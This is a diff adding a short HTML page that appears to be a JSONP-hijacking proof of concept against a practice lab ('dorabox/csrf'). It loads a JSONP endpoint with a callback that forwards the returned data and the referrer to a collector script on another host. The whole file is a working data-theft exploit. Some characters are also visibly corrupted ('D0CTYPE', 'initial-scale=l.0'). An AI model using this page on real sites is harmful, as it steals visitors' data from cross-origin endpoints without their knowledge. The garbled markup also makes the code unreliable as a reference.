@@ -1,0 +1,18 @@
+<!D0CTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible"content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=l.0">
+    <title>List-JSONP</title>
+    <script>
+        function test(args) {
+            location.href="http://192.168.31.238:8080/jsonprecv.php?value="+JSON.stringify(args)+"&referer="+document.referrer;
+        }
+    </script>
+    <script src="http://192.168.31.166/temp/dorabox/csrf/jsonp.php?callback=test"></script>
+</head>
+<body>
+    Good Boy.
+</body>
+</html>
